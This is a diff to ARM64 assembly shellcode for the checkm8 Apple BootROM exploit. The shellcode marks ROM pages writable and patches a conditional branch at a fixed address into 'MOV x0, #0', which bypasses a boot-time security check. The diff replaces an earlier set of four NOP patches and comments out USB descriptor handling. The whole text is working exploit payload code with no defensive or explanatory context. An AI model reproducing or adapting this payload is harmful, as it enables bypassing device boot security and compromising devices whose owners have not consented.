@@ -10,23 +10,20 @@
 .set gDemotionRegister,            0x2102BC000
 
 .set VROM_PAGE_TABLE_ADDR,         0x1800C8400
-.set PATCH_ADDR_0,                 0x100007924
-.set PATCH_ADDR_1,                 0x10000792C
-.set PATCH_ADDR_2,                 0x100007958
-.set PATCH_ADDR_3,                 0x100007C9C
-.set INSN_NOP,                     0xd503201f
+.set PATCH_ADDR,                   0x10000812C // 0x10000812C: CBNZ X8, loc_100008144(C80000B5) -> MOV x0, #0x0(000080D2)
+.set INSN_MOV_X0_0,                0xd2800000
 
 .global _main
 _main:
-  mov   x19, #0                      // HACK: do not free this usb request
+  //mov   x19, #0                      // HACK: do not free this usb request
   stp   x29, x30, [sp, #-0x10]!
   mov   x29, sp
 
-  ldr   x0, =gUSBDescriptors
-  ldp   x0, x1, [x0]
-  adr   x2, USB_DESCRIPTOR
-  ldp   x3, x4, [x2]
-  ldp   x3, x4, [x2, #0x10]
+  //ldr   x0, =gUSBDescriptors
+  //ldp   x0, x1, [x0]
+  //adr   x2, USB_DESCRIPTOR
+  //ldp   x3, x4, [x2]
+  //ldp   x3, x4, [x2, #0x10]
 
   ldr   x0, =gUSBSerialNumber
 _find_zero_loop:
@@ -72,15 +69,9 @@ _eclipsa:
   dsb   sy
   isb
 
-  ldr   w9, =INSN_NOP
-  ldr   x19, =PATCH_ADDR_0
-  ldr   x20, =PATCH_ADDR_1
-  ldr   x21, =PATCH_ADDR_2
-  ldr   x22, =PATCH_ADDR_3
+  ldr   w9, =INSN_MOV_X0_0
+  ldr   x19, =PATCH_ADDR
   str   w9, [x19]
-  str   w9, [x20]
-  str   w9, [x21]
-  str   w9, [x22]
 
   and   x10, x10, #0xff9fffffffffffff
   orr   x10, x10, #0x80
@@ -101,8 +92,8 @@ _end:
   ldp  x29, x30, [sp], #0x10
   ret
 
-USB_DESCRIPTOR:
-.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0
+//USB_DESCRIPTOR:
+//.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0
 
 PWND_STRING:
 .asciz " PWND:[checkm8]"
